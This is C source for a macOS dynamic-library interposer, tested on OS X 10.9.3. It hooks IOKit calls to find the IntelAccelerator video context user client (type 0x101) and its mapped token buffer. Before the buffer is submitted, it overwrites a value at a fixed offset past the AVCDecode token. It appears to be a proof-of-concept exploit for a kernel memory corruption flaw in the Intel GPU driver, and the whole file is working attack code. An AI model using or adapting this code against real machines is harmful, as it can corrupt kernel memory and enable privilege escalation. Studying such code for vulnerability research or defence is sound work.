/*
tested on: MacBookAir5,2 w/ 10.9.3/13d65
*/

#include <inttypes.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

/* what to look for */
const char* target_class_name   = "IntelAccelerator";
uint32_t target_userclient_type = 0x101; // IGAccelVideoContextMedia
uint32_t target_memory_type     = 0;     // token buffer

/* will be invoked before submit_data_buffers is called - can modify token buffer here */
void modify_target_buffer(void* buf, size_t buf_size){
  uint16_t needle = 0x8d00; // AVCDecode token
  
  uint32_t* at = memmem(buf, buf_size, &needle, 2);
  if (at){
    at[0x900/4] = 0x12345678;
  }
}

/* matching userclient port */
mach_port_t target_port         = 0;

void* target_buf                = 0;
size_t target_buf_size          = 0;

kern_return_t
fake_IOConnectMapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t *atAddress,
  vm_size_t *ofSize,
  IOOptionBits options )
{
  kern_return_t ret = IOConnectMapMemory(connect, memoryType, intoTask, atAddress, ofSize, options);
  if (memoryType == target_memory_type && connect == target_port){
    target_buf = *atAddress;
    target_buf_size = *ofSize;
  }
  return ret;
}

kern_return_t
fake_IOConnectUnmapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t atAddress)
{
  if (memoryType == target_memory_type && connect == target_port){
    target_buf = 0;
    target_buf_size = 0;
  }
  return IOConnectUnmapMemory(connect, memoryType, intoTask, atAddress);
}

kern_return_t
fake_IOConnectCallStructMethod(
        mach_port_t      connection,            // In
        uint32_t         selector,              // In
        const void      *inputStruct,           // In
        size_t           inputStructCnt,        // In
        void            *outputStruct,          // Out
        size_t          *outputStructCnt)       // In/Out
{ 
  if (selector == 2 && connection == target_port){
    if (target_buf != 0){
      //perform some action here
      modify_target_buffer(target_buf, target_buf_size);
    }
  }

  return IOConnectCallStructMethod(
          connection,            // In
          selector,              // In
          inputStruct,           // In
          inputStructCnt,        // In
          outputStruct,          // Out
          outputStructCnt);      // In/Out

}

kern_return_t
fake_IOServiceOpen(
  io_service_t service,
  task_port_t owningTask,
  uint32_t  type,
  io_connect_t  * connect )
{
  kern_return_t ret = IOServiceOpen(service, owningTask, type, connect);
  io_name_t className;
  IOObjectGetClass(service, className);
  if (type == target_userclient_type && strcmp(target_class_name, className) == 0){
    target_port = *connect;
  }
  return ret;
}

typedef struct interposer {
  void* replacement;
  void* original;
} interpose_t;

__attribute__((used)) static const interpose_t interposers[]
  __attribute__((section("__DATA, __interpose"))) =
    { {.replacement = (void*)fake_IOConnectMapMemory, .original = (void*)IOConnectMapMemory},
      {.replacement = (void*)fake_IOConnectUnmapMemory, .original = (void*)IOConnectUnmapMemory},
      {.replacement = (void*)fake_IOConnectCallStructMethod, .original = (void*)IOConnectCallStructMethod},
      {.replacement = (void*)fake_IOServiceOpen, .original = (void*)IOServiceOpen},
    };

